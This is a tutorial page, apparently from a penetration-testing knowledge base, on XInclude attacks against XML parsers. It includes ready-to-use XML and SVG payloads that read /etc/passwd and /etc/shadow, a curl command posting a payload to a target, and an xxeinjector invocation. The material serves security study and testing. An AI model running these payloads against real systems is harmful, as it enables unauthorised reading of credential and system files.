---
title: Exploiting XInclude Attacks for File Access
description: Learn how to exploit XInclude in XML parsers for unauthorized file access,
  bypassing traditional XXE protections.
keywords:
- XInclude attacks
- XML parsers
- XXE exploitation
- file inclusion
- SVG XInclude
- arbitrary file read
- XML vulnerability
---

# XInclude Attacks

## Context

XInclude attacks exploit the XML Inclusions (XInclude) mechanism in XML parsers to read arbitrary files on a server. This approach bypasses traditional protections against XML External Entity (XXE) attacks, as XInclude does not rely on DOCTYPE declarations or entity definitions. Attackers leveraging this method can inject `<xi:include>` elements into XML documents, often gaining access to sensitive files on the server. 

A solid understanding of XML structure, parsing, and general XXE exploitation is assumed.

## Theory

### XInclude Mechanism in XML Parsers

XInclude is an XML specification designed to allow parts of an XML document to be constructed by including other XML fragments or text documents through `<xi:include>` elements. This is done without relying on entity references or a DOCTYPE declaration, which makes it a versatile attack vector for bypassing traditional XXE protections. If an XML parser processes untrusted input and includes enabled XInclude support, attackers can leverage this functionality to include and read arbitrary files from the server.

### Non-DOCTYPE XXE via XInclude

Differing from classical XXE attacks, XInclude does not require a DOCTYPE or internal DTD declaration, making it capable of bypassing filters specifically set up to block these components. The basic attack sequence involves injecting an `<xi:include>` element pointing to a desired file, such as `/etc/passwd`, and then exploiting the XML parser to process and return the contents of those files.

### File Inclusion via XInclude

In a successful attack, the injected XInclude directive causes the XML parser to include the content of a local file in the document. This results in the inclusion of sensitive data into the application's response. For an attack to succeed, the target application must use an XML parser with XInclude processing enabled and accept user-inputted XML content.

### XInclude in SVG and Other XML Formats

Formats like SVG, which are XML-based, inherently support the XInclude specification. This broadens the potential attack surface beyond traditional XML APIs, as attackers can embed `<xi:include>` elements in SVG files and other XML formats targeting systems that render or process these files, further elevating the risk associated with XML parsing.

## Practice

### Manual XInclude File Read Attack

- **Craft Payload**: Create an XML payload with `<xi:include>` referencing a file of interest.
  ```xml
  <root xmlns:xi="http://www.w3.org/2001/XInclude">
      <xi:include href="file:///etc/passwd" parse="text"/>
  </root>
  ```
- **Execute Request**: Use a tool like `curl` to send this XML payload to the vulnerable application endpoint.
  ```bash
  curl -X POST -H "Content-Type: application/xml" --data-binary @payload.xml http://target-app/upload
  ```
- **Review Response**: Check the server's response to see if file contents are included.

### Automated XInclude Discovery and Exploitation

- **Run Tool**: Use `xxeinjector` to automate the discovery and exploitation of XInclude vulnerabilities.
  ```bash
  xxeinjector --url http://target-app/upload --xinclude --file /etc/passwd
  ```
- **Analyze Output**: Validate sensitive data retrieval from tool output, such as parts of `/etc/passwd`.
  ```text
  root:x:0:0:root:/root:/bin/bash
  ...
  ```

### XInclude Attack via SVG Upload

- **Create SVG Payload**: Construct an SVG file embedding XInclude for sensitive file inclusion.
  ```xml
  <svg xmlns:xi="http://www.w3.org/2001/XInclude">
      <xi:include href="file:///etc/shadow" parse="text"/>
  </svg>
  ```
- **Upload File**: Use the web applicationâ€™s file upload interface to submit the SVG file.
- **Check Output**: Examine the rendered SVG or server response for sensitive data disclosures.

## Tools

- **xxeinjector**
- **curl**